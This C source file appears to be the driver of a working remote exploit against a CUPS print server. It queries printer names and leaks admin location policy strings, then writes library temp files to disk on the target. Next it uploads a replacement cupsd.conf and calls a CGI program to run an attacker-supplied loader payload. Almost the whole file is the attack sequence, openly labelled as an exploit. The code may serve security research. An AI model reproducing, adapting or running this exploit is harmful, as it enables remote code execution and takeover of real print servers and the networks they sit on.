#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <netdb.h>

#include <ctype.h>

#include "membuf.h"
#include "network.h"
#include "http.h"
#include "ipp.h"
#include "util.h"
#include "loader.h"

#include "exp.h"

extern int request_id;

int connect_to_host(expctx *ctx) {
  struct sockaddr_in sin;
  memset(&sin,0,sizeof(sin));

  sin.sin_family = AF_INET;
  sin.sin_port = htons(ctx->port);

  if(ctx->host_resolved)
    sin.sin_addr.s_addr = ctx->ip;
  else {
    ctx->ip = resolve(ctx->host);
    if(ctx->ip == INADDR_NONE) {
      fprintf(stderr,"Error resolving target host '%s'\n",ctx->host);
      return -1;
    }

    ctx->host_resolved = 1;
    sin.sin_addr.s_addr = ctx->ip;
  }

  int fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

  if(fd < 0) {
    fprintf(stderr,"Error from socket()\n");
    return -1;
  }

  if(connect(fd,(struct sockaddr *)&sin,sizeof(sin))) {
    fprintf(stderr,"Error from connect()\n");
    close(fd);
    return -1;
  }

  ctx->fd = fd;
  return 0;
}

int connect_to_host_if_needed(expctx* ctx) {
  if(ctx->fd <= 0) {
    return connect_to_host(ctx);
  }
  return 0;
}

void close_connection(expctx* ctx) {
  if (ctx->fd > 0) {
    close(ctx->fd);
    ctx->fd = 0;
  }
}

int send_request(expctx* ctx, mem_buf* request, int prompt) {
  if (connect_to_host_if_needed(ctx)) {
    fprintf(stderr, "Error connecting to host '%s:%d'\n", ctx->host, ctx->port);
    return -1;
  }
  if (prompt) {
    fprintf(stdout, "Press enter to send request:\n\n");
    getchar();
  }
  return network_write(ctx->fd, request->buf, request->used);
}

mem_buf *send_request_read_response(expctx *ctx,mem_buf *request) {
  int ret = 0;
  mem_buf *resp;
  int respcode = -1;

  if (send_request(ctx, request, 1)) {
    fprintf(stderr, "Error sending request\n");
    return NULL;
  }

  resp = network_read_to_buf(ctx->fd);

  if(!resp) {
    fprintf(stderr,"Error getting response to query\n");
  }

  return resp;
}

int send_request_read_response_check_respcode(expctx *ctx, uritest *u, mem_buf *req) {
  int ret = 0;
  mem_buf *resp;
  int respcode = -1;

  resp = send_request_read_response(ctx, req);

  if(resp == NULL) {
    fprintf(stderr, "Error getting response to exploit query\n");
    return -1;
  } else {
    fprintf(stdout,"Response to exploit:\n");
    fprintf(stdout,"%s",resp->buf);
    fprintf(stdout,"\n\n");
  }

  respcode = parse_resp_code(resp);

  if(respcode < 0) {
    fprintf(stderr,"Error parsing response code\n");
    ret = -1;
  } else {
    if(respcode != u->exp_resp) {
      fprintf(stderr,"Unexpected response code %d, expected %d from '%s'\n",respcode,u->exp_resp,u->uribase);
      ret = -1;
    } else {
      fprintf(stdout,"Response code is: %d, matches expected for '%s'\n",respcode,u->uribase);
    }
  }

  mem_buf_free(resp);
  return ret;
}

int send_request_parse_response(expctx* ctx, uritest* u, mem_buf *req, int type) {
  int ret = 0;
  mem_buf *resp;
  int respcode = -1;

  resp = send_request_read_response(ctx, req);

  if(resp == NULL) {
    fprintf(stderr, "Error getting response to exploit query\n");
    return -1;
  } else {
    fprintf(stdout,"Response to exploit:\n");
    fprintf(stdout,"%s",resp->buf);
    fprintf(stdout,"\n\n");
  }

  if (parse_response(ctx, u, resp, type)) {
    fprintf(stderr,"Error parsing response\n");
    ret = -1;
  }

  mem_buf_free(resp);
  return ret;
}

int send_request_close_connection(expctx* ctx, mem_buf* req) {
  if (connect_to_host_if_needed(ctx)) {
    fprintf(stderr, "Error connecting to target host '%s:%d'\n", ctx->host, ctx->port);
    return -1;
  }

  if (send_request(ctx, req, 0)) {
    fprintf(stderr, "Error sending request.\n");
    return -1;
  }

  close_connection(ctx);
  return 0;
}

int seed_libraries(expctx* ctx) {
  uritest u;
  memset(&u, 0, sizeof(u));
  u.method = EXP_METHOD;
  u.uribase = EXP_URI;

  mem_buf* req = build_exploit_payload_seed_library(ctx, &u);
  if (req == NULL || req->used == 0) {
    fprintf(stderr, "Error getting library payload to seed\n");
    if (req != NULL)
      mem_buf_free(req);
    return -1;
  }
  fprintf(stdout, "Seeding %zd libraries to disk\n", ctx->num_temp_files);
  for (int i = 0; i < ctx->num_temp_files; i++) {
    if (send_request_close_connection(ctx, req)) {
      fprintf(stderr, "Error sending request with library body\n");
      mem_buf_free(req);
      return -1;
    }
    // Sleep 1/100th of a second between connections.
    usleep(10000);
  }
  fprintf(stdout, "Done!\n");
  mem_buf_free(req);
  return 0;
}

int test_exploit_against_uri(expctx *ctx, uritest *u) {
  int ret = 0;
  mem_buf *req;
  mem_buf *resp;
  int respcode = -1;

  fprintf(stdout, "Connecting to host...\n");

  if (connect_to_host(ctx)) {
    fprintf(stderr, "Error connecting to host\n");
    return -1;
  }
/*
  fprintf(stdout, "Adding printer...\n");

  req = build_exploit_payload_addprinter(ctx, u);

  if (send_request_read_response_check_respcode(ctx, u, req)) {
    fprintf(stderr, "Error addming printer\n");
    mem_buf_free(req);
    return -1;
  }
*/
  fprintf(stdout, "Getting printer name...\n");

  req = build_exploit_payload_getprinter(ctx, u);

  if(req == NULL) {
    fprintf(stderr,"Error building request for printer names\n");
    return -1;
  }

  if (send_request_parse_response(ctx, u, req, GET_PRINTERNAME)) {
    fprintf(stderr, "Error parsing response to get printer name\n");
    return -1;
  }

  mem_buf_free(req);

  fprintf(stdout,"Building exploit payload to clear location settings for /admin/conf...\n");

  req = build_exploit_payload_adminconf(ctx, u);

  if(req == NULL) {
    fprintf(stderr,"Error building exploit payload for location policy string\n");
    return -1;
  }

  if (send_request_read_response_check_respcode(ctx, u, req)) {
    fprintf(stderr, "Error leaking location policy string\n");
    mem_buf_free(req);
    return -1;
  }

  mem_buf_free(req);

  req = build_exploit_payload_admin(ctx, u);

  if(req == NULL) {
    fprintf(stderr,"Error building exploit payload for location policy string\n");
    return -1;
  }

  if (send_request_read_response_check_respcode(ctx, u, req)) {
    fprintf(stderr, "Error leaking location policy string\n");
    mem_buf_free(req);
    return -1;
  }

  mem_buf_free(req);

  fprintf(stdout, "Seeding %zd library temp files for exploitation...\n", ctx->num_temp_files);

  if (seed_libraries(ctx)) {
    fprintf(stderr, "Error seeding libraries to disk for exploitation\n");
    return -1;
  }

  fprintf(stdout, "Successfully seeded libraries, sending new config...\n");

  uritest u_config;
  memset(&u_config, 0, sizeof(u_config));
  u_config.method = EXP_CONFIG_METHOD;
  u_config.uribase = EXP_CONFIG_URI;
  u_config.exp_resp = 201;

  req = build_exploit_payload_newconfig(ctx, &u_config);

  if (req == NULL) {
    fprintf(stderr,"Error building exploit payload to update cupsd.conf\n");
    return -1;
  }

  if (send_request_read_response_check_respcode(ctx, &u_config, req)) {
    fprintf(stderr, "Error setting new cupsd config file\n");
    mem_buf_free(req);
    return -1;
  }

  mem_buf_free(req);

  fprintf(stdout, "Invoking CGI application to trigger execution...\n");

  uritest u_cgi;
  memset(&u_cgi, 0, sizeof(u_cgi));
  u_cgi.method = METHOD_GET;
  u_cgi.uribase = EXP_CGI_URI;
  u_cgi.exp_resp = 500;

  req = build_exploit_payload_generic(ctx, &u_cgi);

  if (req == NULL) {
    fprintf(stderr,"Error building request to invoke CGI\n");
    return -1;
  }

  // The server will hang-up on us after loading the new configuration file.
  close_connection(ctx);

  if (send_request_read_response_check_respcode(ctx, &u_cgi, req)) {
    fprintf(stderr, "Error invoking CGI\n");
    mem_buf_free(req);
    return -1;
  }

  mem_buf_free(req);
  close_connection(ctx);
  return ret;
}

void single_exploit(expctx *ctx) {
  uritest u;

  memset(&u,0,sizeof(u));
  u.method = EXP_METHOD;
  u.uribase = EXP_URI;
  u.exp_resp = 200;

  if(test_exploit_against_uri(ctx,&u)) {
    fprintf(stderr,"Error testing exploit against uri '%s'\n",u.uribase);
  } else {
    fprintf(stdout,"Successfull test against '%s'\n",u.uribase);
  }

  return;
}

void usage() {
  fprintf(stderr,"Usage:\n");
  fprintf(stderr,"-h host		(host to target)\n");
  fprintf(stderr,"-p port		(default: 80)\n");
  fprintf(stderr,"\n");
  exit(-1);
}

void init_expctx(expctx *ctx) {
  if(!ctx->host) {
    ctx->host = EXP_HOST;
  }

  if(ctx->port == 0) {
    ctx->port = EXP_PORT;
  } else if(ctx->port < 0 || ctx->port > 65535) {
    fprintf(stderr,"Invalid port '%d'\n",ctx->port);
    usage();
  }

  if (!ctx->admin_conf_location_string) {
    ctx->admin_conf_location_string = "/admin/conf";
    ctx->admin_conf_leak_count = 10;
  }

  if (!ctx->admin_location_string) {
    ctx->admin_location_string = "/admin";
    ctx->admin_leak_count = 10;
  }

  ctx->target_os = EXP_OS;
  ctx->target_arch = EXP_ARCH;
  ctx->num_temp_files = EXP_NUM_TEMP_FILES;

  ctx->cups_config_content = mem_buf_new();
  get_cupsd_conf(ctx->cups_config_content, ctx->target_os, ctx->num_temp_files - 1);

  ctx->loader_payload = mem_buf_new();
  get_loader_payload(ctx->loader_payload, ctx->target_os, ctx->target_arch);

  ctx->ip = resolve(ctx->host);

  if(ctx->ip == INADDR_NONE) {
    fprintf(stderr,"Error resolving hostname '%s'\n",ctx->host);
  }

  ctx->host_resolved = 1;
  return;
}

void zero_expctx(expctx *ctx) {
  memset(ctx,0,sizeof(*ctx));
  return;
}

int main(int argc,char **argv) {
  expctx ctx;
  char *host = NULL;
  int port = EXP_PORT;
  int c;

  request_id = getpid() * 0x100;

  zero_expctx(&ctx);

  fprintf(stdout,"Test exploit\n");

  while(1) {
    c = getopt(argc,argv,"h:p:");

    if(c == -1)
      break;

    switch(c) {
      case 'h':
        ctx.host = strdup(optarg);
        break;
      case 'p':
        ctx.port = atoi(optarg);
        break;
      default:
        fprintf(stderr,"Unknown command-line parameter '%c'\n",c);
        usage();
    }
  }

  init_expctx(&ctx);

  single_exploit(&ctx);

  return 0;
}
